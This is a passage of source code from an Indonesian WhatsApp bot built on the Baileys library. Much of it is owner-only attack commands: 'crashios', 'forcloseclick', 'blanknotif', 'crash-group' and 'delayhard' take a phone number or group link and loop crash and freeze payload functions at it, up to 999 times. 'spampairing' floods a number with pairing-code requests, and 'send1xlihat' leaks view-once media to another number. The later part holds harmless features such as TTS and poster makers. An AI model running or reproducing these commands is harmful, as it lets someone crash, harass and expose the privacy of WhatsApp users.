                for (let i = 0; i < 5; i++) {
                    await CrashPacksNew(target); 
                }
                console.log(chalk.red.bold("Sukses Mengirim Bug Jenis : Bug Emoji!!"))
            }
            break;    
                        case 'forcloseclick': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 50; i++) {
                    await ForceClickNewArsyilCynxo(target);
                    await CrashXFreeze(target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'crashsystem':
            case 'crashui':
            case 'blanknotif': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 200; i++) {
                    await OctoberNewUi(target);
                    await HpKentangJelek(conn, target);
                    await OctoberNewUi(target);
                    await sleep(100);   
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'fcsaluran':
            case 'crashsaluran': {
                if (!isCreator) return Reply(mess.owner)
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        for (let i = 0; i < 300; i++) {
            await InvisibleSletterCrash(m.chat);
        }
    }
    break;
    case 'spampairing':
    case 'spairing': {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return Reply(`*Example:* ${prefix + command} +628xxxxxx|150`);
  Reply('proses...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;
    case 'crashbeta':
    case 'spamcallvideo': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 999; i++) {
                   await ArsyilCynxoBetaFC(conn, target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            case 'forclose-blank': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return eply(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 100; i++) {
                   await CrashXFreeze(target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'crashios': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 50; i++) {
                   await await NullCrL(target);
                   await await NullCrL(target);
                   await sleep(200);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
case 'peler-group': {
    if (!isCreator) return Reply(mess.owner);
    if (!q) return Reply(`Example: ${prefix + command} https://chat.whatsapp.com/ABCDEFG12345`);

    if (!/^https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)(\?.*)?$/i.test(q.trim())) {
    return Reply("❌ Masukkan link grup WhatsApp yang valid.");
}

    const inviteCode = q.split("/").pop();
    const targetgroup = await conn.groupAcceptInvite(inviteCode);

    await Reply("✅ Sukses KILL GROUP");

    for (let i = 0; i < 50; i++) {
        await ForceCrashPayment(targetgroup);
        await sleep(970)
    }
}
break;
                      case 'seto-group':
                      case 'delay-group': {
        if (!isCreator) return Reply(mess.owner)
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        for (let i = 0; i < 50; i++) {
            await CrashPacksNew(m.chat);
            await CrashGroups(m.chat);
            await sleep(970)
        }
    }
    break;
                      case 'freeze-group':
                      case 'crash-group': {
        if (!isCreator) return Reply(mess.owner)
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        for (let i = 0; i < 20; i++) {
            await CrashPacksNew(m.chat);
            await CrashGroups(m.chat);
            await sleep(1000)
        }
    }
    break;
           case 'delayhard': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! sent delay invisible to ${target}`);
                
                 for (let i = 0; i < 50; i++) {
                   await inviscall(conn, target);
                   await StuckBlank(target); 
                   await sleep(200);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            
           case 'blanknew': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 200; i++) {
                   await StuckBlank(target);
                   await HpKentang(target); 
                   await sleep(200);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;

           case 'forcenew': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 50; i++) {
                   await TesFc(target);
                   await TesFc(target); 
                   await sleep(200);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;

function extractId(url) {
    try {
        const parts = new URL(url).pathname.split('/').filter(Boolean);
        const id = parts.pop();
        return id || null;
    } catch (e) {
        return null;
    }
};

case "skipcode": {
    try {
        let [link, type] = text.split(" ");
        if (!link.includes("github")) return Reply(`⚠️ Masukan Link Gits Code!
 \`--doc\` kirim pesan code pake document`);

        const id = extractId(link)
        const getRaw = await (await axios.get(`https://api.github.com/gists/${id}`)).data;
        const files = Object.values(getRaw?.files || []);

        for (let i = 0; files.length > 0 && i < files.length; i++) {
            const file = files[i]

            if (type?.endsWith("--doc")) {
                const buffer = Buffer.from(file.content, "utf-8")

                await conn.sendMessage(m.chat, {
                    document: buffer,
                    fileName: file.filename,
                    mimetype: file.type
                }, {
                    quoted: m
                })
            } else {
                await Reply(file.content)
            };
        };

    } catch (e) {
        Reply("❌ Gomene Error Mungkin lu kebanyakan request");
        console.error(e);
    };
};
break
case "tts": {
    if (!text) return Reply("Contoh: .tts halo aku bot kelpin");

    try {
        const axios = require("axios");

        // pakai Google Translate TTS (no apikey)
        let url = `https://translate.google.com/translate_tts?ie=UTF-8&tl=id&client=tw-ob&q=${encodeURIComponent(text)}`;

        await conn.sendMessage(m.chat, {
            audio: { url: url },
            mimetype: "audio/mpeg",
            ptt: false,
            contextInfo: {
                externalAdReply: {
                    title: "Text To Speech",
                    body: text,
                    thumbnailUrl: "https://img2.pixhost.to/images/7475/719282295_papaqueen.jpg",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.log(e);
        Reply("❌ Gagal convert text ke suara");
    }
}
break
case "ttsanime": {
    if (!text) return Reply("Contoh: .ttsanime halo aku bot kelpin");

    try {
        const axios = require("axios");

        // Suara Jepang cewek → terdengar seperti anime
        let url = `https://translate.google.com/translate_tts?ie=UTF-8&tl=ja&client=tw-ob&q=${encodeURIComponent(text)}`;

        await conn.sendMessage(m.chat, {
            audio: { url: url },
            mimetype: "audio/mpeg",
            ptt: false,
            contextInfo: {
                externalAdReply: {
                    title: "TTS Suara Anime",
                    body: text,
                    thumbnailUrl: "https://img2.pixhost.to/images/7475/719282295_papaqueen.jpg",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.log(e);
        Reply("❌ Gagal convert text ke suara anime");
    }
}
break;
case "copyid": {
    if (!text) return m.reply("ID grup tidak ditemukan!");
    await m.reply(`📌 ID Grup:\n${text}`);
}
break;
case "swgrup2": {
    if (!isCreator && !isAdmin) return Reply(mess.admin);

    if (!text) return Reply(`contoh:\n.swgrup 1203630xxxxx@g.us halo semua`);

    let [idgc, ...pesan] = text.split(" ");
    let caption = pesan.join(" ");

    if (!idgc.endsWith("@g.us")) return Reply("ID grup tidak valid!");

    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || "";

    if (/image/.test(mime)) {
        const buffer = await quoted.download();
        await conn.sendMessage(idgc, {
            groupStatusMessage: {
                image: buffer,
                caption
            }
        });

    } else if (/video/.test(mime)) {
        const buffer = await quoted.download();
        await conn.sendMessage(idgc, {
            groupStatusMessage: {
                video: buffer,
                caption
            }
        });

    } else if (/audio/.test(mime)) {
        const buffer = await quoted.download();
        await conn.sendMessage(idgc, {
            groupStatusMessage: {
                audio: buffer
            }
        });

    } else if (caption) {
        await conn.sendMessage(idgc, {
            groupStatusMessage: {
                text: caption
            }
        });

    } else {
        return Reply(`Reply media atau teks!\ncontoh:\n.swgrup 1203630xxxxx@g.us halo`);
    }

    // react sukses
    await conn.sendMessage(m.chat, {
        react: { text: "✅", key: m.key }
    });
}
break;
case "cekid": {
    if (!isCreator && !isAdmin) return m.reply("Hanya admin/creator yang bisa menggunakan ini!");

    // Ambil semua grup yang bot join
    let groups = await conn.groupFetchAllParticipating();
    let groupList = Object.values(groups);

    if (!groupList.length) return m.reply("Bot belum join grup apapun!");

    // Preview 5 grup pertama biar nggak diem
    let preview = groupList.slice(0, 5).map((g, i) => `${i+1}. ${g.subject}`).join("\n");
    await conn.sendMessage(m.chat, {
        text: `⚡ *KELPIN GROUP LIST* ⚡\n\nContoh grup:\n${preview}\n\nKlik tombol di bawah untuk pilih grup dan dapatkan ID:`,
    }, { quoted: m });

    // Delay biar smooth
    await new Promise(res => setTimeout(res, 800));

    // Rows untuk tombol list
    let rows = groupList.map(g => ({
        title: g.subject || "No Name",
        description: "Klik untuk menyalin ID grup",
        id: `.copyid ${g.id}` // nanti bikin case copyid
    }));

    // Tombol list
    await conn.sendMessage(m.chat, {
        text: "📂 Pilih grup untuk mendapatkan ID:",
        buttons: [
            {
                buttonId: "select_group",
                buttonText: { displayText: "⚡ LIST GRUP BOT" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "Grup Bot Join",
                        sections: [
                            {
                                title: "Pilih Grup",
                                rows: rows
                            }
                        ]
                    })
                }
            }
        ]
    }, { quoted: m });
}
break;
case "swgc":
            case "swgrup": {
            if (!isCreator && !isAdmin) return Reply(mess.admin) 
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.upswgc\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await conn.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                        await conn.sendMessage(from, {
        react: {
            text: "✅",
            key: m.key
        }
    });
 //                   m.react("✅️")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await conn.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                        await conn.sendMessage(from, {
        react: {
            text: "✅",
            key: m.key
        }
    });
//                    m.react("✅️")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await conn.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                        await conn.sendMessage(from, {
        react: {
            text: "✅",
            key: m.key
        }
    });
//                    m.react("✅️")
                } else if (caption) {
                    await conn.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                        await conn.sendMessage(from, {
        react: {
            text: "✅",
            key: m.key
        }
    });
//                    m.react("✅️")
                } else {
                    await Reply(`Reply media atau tambahkan teks.\nexample: ${prefix + command} (Reply image/video/audio) hai ini saya`);
                }
            }
            break;
case "sertifikatjawa":
case "stfjawa": {
    const { createCanvas } = require('canvas')

    const input = args.join(" ")
    const [nama, judul] = input.split("|").map(s => s.trim())

    if (!nama || !judul) {
        return Reply(`Contoh:\n${prefix}stfjawa Kelpin|Orang Paling Ganteng Se-Jawa`)
    }

    try {
        const width = 1400
        const height = 900
        const canvas = createCanvas(width, height)
        const ctx = canvas.getContext('2d')

        // 🟤 background coklat elegan (tema jawa)
        const gradient = ctx.createLinearGradient(0, 0, width, height)
        gradient.addColorStop(0, "#3e2723")
        gradient.addColorStop(1, "#6d4c41")
        ctx.fillStyle = gradient
        ctx.fillRect(0, 0, width, height)

        // 🟡 border emas
        ctx.strokeStyle = "#FFD700"
        ctx.lineWidth = 20
        ctx.strokeRect(30, 30, width - 60, height - 60)

        // 🟡 inner border
        ctx.lineWidth = 5
        ctx.strokeRect(60, 60, width - 120, height - 120)

        // 🏵️ judul utama
        ctx.fillStyle = "#FFD700"
        ctx.font = "bold 65px serif"
        ctx.textAlign = "center"
        ctx.fillText("SERTIFIKAT PANGHARGAAN", width / 2, 180)

        // 🏵️ subjudul jawa
        ctx.font = "40px serif"
        ctx.fillText("Minangka Wujud Apresiasi", width / 2, 250)

        // 👤 nama penerima
        ctx.fillStyle = "#FFFFFF"
        ctx.font = "bold 60px serif"
        ctx.fillText(nama, width / 2, 450)

        // 🎖️ deskripsi penghargaan
        ctx.font = "45px serif"
        ctx.fillStyle = "#FFE4B5"
        ctx.fillText(judul, width / 2, 550)

        // ✨ tagline jawa
        ctx.font = "30px serif"
        ctx.fillStyle = "#DDD"
        ctx.fillText("Mugi tansah pinaringan kabegjan lan kasuksesan", width / 2, 650)

        // 📅 tanggal
        ctx.font = "28px serif"
        ctx.fillText(new Date().toLocaleDateString("id-ID"), width / 2, 750)

        // 🖼️ convert ke buffer
        const buffer = canvas.toBuffer("image/png")

        // 📤 kirim
        await conn.sendMessage(m.chat, {
            image: buffer,
            caption: `🎉 Sertifikat Jawa untuk *${nama}* \n\n> 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙖𝙙𝙚 𝙗𝙮 𝙠𝙚𝙡𝙥𝙞𝙣`
        }, { quoted: m })

    } catch (e) {
        console.error("ERROR stfjawa:", e)
        Reply("❌ Gagal membuat sertifikat jawa")
    }
}
break
case "pegangtext": {
    const { createCanvas, loadImage } = require('canvas')

    let text = args.join(" ")
    if (!text) return Reply(`Contoh:\n${prefix}gatau kelpin ganteng`)

    try {
        const width = 1024
        const height = 1024
        const canvas = createCanvas(width, height)
        const ctx = canvas.getContext("2d")

        // 🔥 load gambar
        let img = await loadImage("https://img2.pixhost.to/images/6984/712419162_settomodders.jpg")
        ctx.drawImage(img, 0, 0, width, height)

        // ✍️ STYLE TEKS
        ctx.fillStyle = "#000"
        ctx.font = "bold 45px Arial"
        ctx.textAlign = "center"

        // 🔥 SHADOW BIAR REAL
        ctx.shadowColor = "rgba(0,0,0,0.25)"
        ctx.shadowBlur = 5
        ctx.shadowOffsetX = 2
        ctx.shadowOffsetY = 2

        // 🔥 AUTO WRAP + CENTER
        function wrapText(ctx, text, x, y, maxWidth, lineHeight) {
            let words = text.split(" ")
            let line = ""
            let lines = []

            for (let n = 0; n < words.length; n++) {
                let testLine = line + words[n] + " "
                let testWidth = ctx.measureText(testLine).width

                if (testWidth > maxWidth && n > 0) {
                    lines.push(line)
                    line = words[n] + " "
                } else {
                    line = testLine
                }
            }
            lines.push(line)

            // 🔥 center vertikal
            let totalHeight = lines.length * lineHeight
            let startY = y - (totalHeight / 2)

            lines.forEach((line, i) => {
                ctx.fillText(line, x, startY + (i * lineHeight))
            })
        }

        // 📍 POSISI UDAH DIPASSIN
        wrapText(ctx, text, 512, 680, 560, 50)

        const buffer = canvas.toBuffer("image/png")

        await conn.sendMessage(m.chat, {
            image: buffer,
            caption: "📝 Nih hasilnya 😎\n\n> 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙖𝙙𝙚 𝙗𝙮 𝙠𝙚𝙡𝙥𝙞𝙣"
        }, { quoted: m })

    } catch (e) {
        console.log(e)
        Reply("❌ Error load gambar / URL")
    }
}
break
case "send1xlihat": {
if (!m.quoted) return Reply("Reply pesan viewOnce!")
let nomor = args[0]
if (!nomor) return Reply(`Contoh:\n${prefix}send1xlihat kenomor tujuan\ncontoh .send1xlihat 628xxxx`)

let jid = nomor.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

try {
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]

    if (!msg[type].viewOnce) return Reply("❌ Pesan itu bukan viewOnce!")

    // 🔥 ambil media
    let media = await downloadContentFromMessage(
        msg[type],
        type == 'imageMessage' ? 'image' :
        type == 'videoMessage' ? 'video' :
        'audio'
    )

    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }

    // 🔥 kirim ke nomor
    if (/video/.test(type)) {
        await conn.sendMessage(jid, {
            video: buffer,
            caption: msg[type].caption || ""
        })
    } else if (/image/.test(type)) {
        await conn.sendMessage(jid, {
            image: buffer,
            caption: msg[type].caption || ""
        })
    } else if (/audio/.test(type)) {
        await conn.sendMessage(jid, {
            audio: buffer,
            mimetype: "audio/mpeg",
            ptt: true
        })
    }

    Reply("✅ ViewOnce berhasil dikirim ke nomor!")

} catch (e) {
    console.log(e)
    Reply("❌ Gagal kirim viewOnce")
}
}
break
case "wantedganteng": {
    const { createCanvas, loadImage } = require('canvas')

    let text = args.join(" ")
    if (!text) return Reply(`Contoh:\n${prefix}wanted kelpin si paling ganteng+reply foto 😎`)

    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || ''

    if (!/image/.test(mime)) {
        return Reply("📸 Kirim / reply gambar!\nContoh: .wanted Agus + kirim foto")
    }

    try {
        const width = 1024
        const height = 1400
        const canvas = createCanvas(width, height)
        const ctx = canvas.getContext("2d")

        // background
        ctx.fillStyle = "#f4e7c5"
        ctx.fillRect(0, 0, width, height)

        // border
        ctx.strokeStyle = "#3b2f1c"
        ctx.lineWidth = 20
        ctx.strokeRect(20, 20, width - 40, height - 40)

        // ambil gambar user
        let media = await q.download()
        let img = await loadImage(media)

        // gambar bulat
        let size = 350
        let y = 350

        ctx.save()
        ctx.beginPath()
        ctx.arc(width / 2, y + size / 2, size / 2, 0, Math.PI * 2)
        ctx.clip()
        ctx.drawImage(img, width / 2 - size / 2, y, size, size)
        ctx.restore()

        // judul
        ctx.fillStyle = "#3b2f1c"
        ctx.font = "bold 120px serif"
        ctx.textAlign = "center"
        ctx.fillText("WANTED", width / 2, 150)

        // sub
        ctx.font = "bold 50px serif"
        ctx.fillText("DEAD OR ALIVE", width / 2, 230)

        // nama
        ctx.font = "bold 70px serif"
        ctx.fillText(text, width / 2, 780)

        // 🔥 DESKRIPSI KECIL
        ctx.font = "28px serif"

        function wrapText(ctx, text, x, y, maxWidth, lineHeight) {
            let words = text.split(" ")
            let line = ""

            for (let n = 0; n < words.length; n++) {
                let testLine = line + words[n] + " "
                let testWidth = ctx.measureText(testLine).width

                if (testWidth > maxWidth && n > 0) {
                    ctx.fillText(line, x, y)
                    line = words[n] + " "
                    y += lineHeight
                } else {
                    line = testLine
                }
            }
            ctx.fillText(line, x, y)
        }

        let desc = `Dicari karena ${text} terlalu mencolok di masyarakat. Terakhir terlihat membuat keributan karena kegantengan yang berlebihan. Jika menemukan orang ini, segera laporkan ke PETUGAS TERDEKAT.`

        wrapText(ctx, desc, width / 2, 850, 800, 35)

        // bounty
        ctx.font = "bold 60px serif"
        ctx.fillText("$999,999,999", width / 2, 1050)

        // footer
        ctx.font = "30px serif"
        ctx.fillText("KELPIN WANTED SYSTEM", width / 2, 1250)

        const buffer = canvas.toBuffer("image/png")

        await conn.sendMessage(m.chat, {
            image: buffer,
            caption: "💀 Buronan level dewa terdeteksi!"
        }, { quoted: m })

    } catch (e) {
        console.log(e)
        Reply("❌ Error membuat poster")
    }
}
break
case "wanted": {
    const { createCanvas, loadImage } = require('canvas')

    let text = args.join(" ")
    if (!text) return Reply(`Contoh:\n${prefix}wanted kelpin si paling ganteng+reply foto`)

    // 🔥 ambil gambar dari user
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || ''

    if (!/image/.test(mime)) {
        return Reply("📸 Kirim / reply gambar!\nContoh: .wanted Agus + kirim foto")
    }

    try {
        const width = 1024
        const height = 1400
        const canvas = createCanvas(width, height)
        const ctx = canvas.getContext("2d")

        // 🔥 background
        ctx.fillStyle = "#f4e7c5"
        ctx.fillRect(0, 0, width, height)

        // 🔥 border
        ctx.strokeStyle = "#3b2f1c"
        ctx.lineWidth = 20
        ctx.strokeRect(20, 20, width - 40, height - 40)

        // 🔥 download gambar user
        let media = await q.download()
        let img = await loadImage(media)

        // 🔥 gambar bulat (crop)
        let size = 350
        let x = width / 2 - size / 2
        let y = 350

        ctx.save()
        ctx.beginPath()
        ctx.arc(width / 2, y + size / 2, size / 2, 0, Math.PI * 2)
        ctx.closePath()
        ctx.clip()
        ctx.drawImage(img, x, y, size, size)
        ctx.restore()

        // 🔥 judul
        ctx.fillStyle = "#3b2f1c"
        ctx.font = "bold 120px serif"
        ctx.textAlign = "center"
        ctx.fillText("WANTED", width / 2, 150)

        // 🔥 sub
        ctx.font = "bold 50px serif"
        ctx.fillText("DEAD OR ALIVE", width / 2, 230)

        // 🔥 nama
        ctx.font = "bold 70px serif"
        ctx.fillText(text, width / 2, 780)

        // 🔥 bounty
        ctx.font = "bold 60px serif"
        ctx.fillText("$999,999,999", width / 2, 900)

        // 🔥 footer
        ctx.font = "30px serif"
        ctx.fillText("KELPIN WANTED SYSTEM", width / 2, 1200)

        const buffer = canvas.toBuffer("image/png")

        await conn.sendMessage(m.chat, {
            image: buffer,
            caption: "💀 Buronan berhasil dibuat!"
        }, { quoted: m })

    } catch (e) {
        console.log(e)
        Reply("❌ Error membuat poster")
    }
}
break
case "hd":
case "tohd": {
try {

if (!m.quoted) return Reply("📸 reply gambar")

let mime = (m.quoted.msg || m.quoted).mimetype || ''
if (!mime.includes("image")) return Reply("❌ harus gambar")

Reply("⏳ processing HD...")

// 🔥 ambil buffer
let buffer = await m.quoted.download()
if (!buffer) return Reply("❌ gagal ambil gambar")

// 🔥 function HD anti crash
const HD = async (buffer) => {
try {
const img = await Jimp.read(buffer)

return await img
.resize(img.bitmap.width * 4, img.bitmap.height * 4)
.quality(100)
.getBufferAsync(Jimp.MIME_JPEG)

} catch (e) {
console.log("JIMP ERROR:", e)
throw "jimp error"
}
}

// 🔥 proses
let hasil = await HD(buffer)

// 🔥 kirim
await conn.sendMessage(m.chat, {
image: hasil,
caption: "✨ HD 4x berhasil\n> Kelpin GV"
}, { quoted: m })

} catch (e) {
console.log("ERROR HD:", e)
Reply("❌ gagal convert HD (image tidak support)")
}
}
break

case "addprem": case "addpremium": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
Reply(`Berhasil menambah User kacung jadi Prem  ✅`)
}
break

case 'totalchat':
case 'statgroup': {
  if (!m.isGroup) return Reply('Fitur ini hanya bisa digunakan di grup.');
  const stats = getTodayStats(m.chat)
  if (Object.keys(stats).length === 0) return Reply('Belum ada data chat hari ini.')
  let teks = `*Statistik Chat Hari Ini:*\n\n`
  const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1])
  let i = 1
  for (const [user, total] of sorted) {
    const name = conn.getName ? await conn.getName(user) : user.split('@')[0]
    teks += `${i++}. ${name} - ${total} chat\n`
  }
  Reply(teks)
}
break

case 'sf':
case 'sfile': {
  try {
    const axios = require("axios");
    const mime = require("mime-types");   
    const cheerio = require("cheerio");    

const sfile = {
  createHeaders: referer => ({
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="137", "Google Chrome";v="137"',
    'dnt': '1',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'Referer': referer,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9'
  }),

  extractCookies: h => h['set-cookie']?.map(c => c.split(';')[0]).join('; ') || '',

  extractMetadata: $ => {
    const m = {}
    $('.file-content').eq(0).each((_, e) => {
      const x = $(e)
      m.file_name = x.find('img').attr('alt')
      m.mimetype = x.find('.list').eq(0).text().trim().split('-')[1].trim()
      m.upload_date = x.find('.list').eq(2).text().trim().split(':')[1].trim()
      m.download_count = x.find('.list').eq(3).text().trim().split(':')[1].trim()
      m.author_name = x.find('.list').eq(1).find('a').text().trim()
    })
    return m
  },

  makeRequest: async (u, o) => {
    try { return await axios.get(u, o) }
    catch (e) { if (e.response) return e.response; throw new Error(`Request gagal: ${e.message}`) }
  },

  download: async (url, resultBuffer = false) => {
    try {
      let h = sfile.createHeaders(url)
      const init = await sfile.makeRequest(url, { headers: h })
      const ck = sfile.extractCookies(init.headers)
      h.Cookie = ck
      let $ = cheerio.load(init.data)
      const meta = sfile.extractMetadata($)
      const dl = $('#download').attr('href')
      if (!dl) throw new Error('Download URL gak ketemu')
      h.Referer = dl
      const proc = await sfile.makeRequest(dl, { headers: h })
      const html = proc.data
      $ = cheerio.load(html)
      const scr = $('script').map((i, el) => $(el).html()).get().join('\n')
      const re = /https:\\\/\\\/download\d+\.sfile\.mobi\\\/downloadfile\\\/\d+\\\/\d+\\\/[a-z0-9]+\\\/[^\s'"]+\.[a-z0-9]+(\?[^"']+)?/gi
      const mt = scr.match(re)
      if (!mt?.length) throw new Error('Link download final gak ketemu di script')
      const fin = mt[0].replace(/\\\//g, '/')
      let download
      if (resultBuffer) {
        const file = await sfile.makeRequest(fin, { headers: h, responseType: 'arraybuffer' })
        download = Buffer.from(file.data)
      } else download = fin
      return { metadata: meta, download }
    } catch (e) { throw new Error(`${e.message}`) }
  }
}
    if (!args[0]) return Reply('*Example :* .sfile https://sfile.mobi/2E5O1HMVKcc')
    let data = await sfile.download(args[0], true)
    let { file_name, mimetype, upload_date, download_count, author_name } = data.metadata
    let type = mime.lookup(file_name) || 'application/octet-stream'
    await conn.sendMessage(m.chat, { document: data.download, fileName: file_name, mimetype: type }, { quoted: m })
  } catch (e) { Reply(e.message) }
}
break

case 'tofigure':
case 'tofigure2': {
  try {
    const axios = require("axios");
    const FormData = require("form-data");

    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || "";

    if (!/image/.test(mime))
      return Reply(`✨ Balas *gambar* dengan caption *.${command}*`);

    await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

    // Unduh gambar
    const buffer = await q.download();
    if (!buffer) throw new Error("❌ Gagal mengunduh gambar");

    // Upload ke Catbox
    const uploadToCatbox = async (buffer) => {
      const form = new FormData();
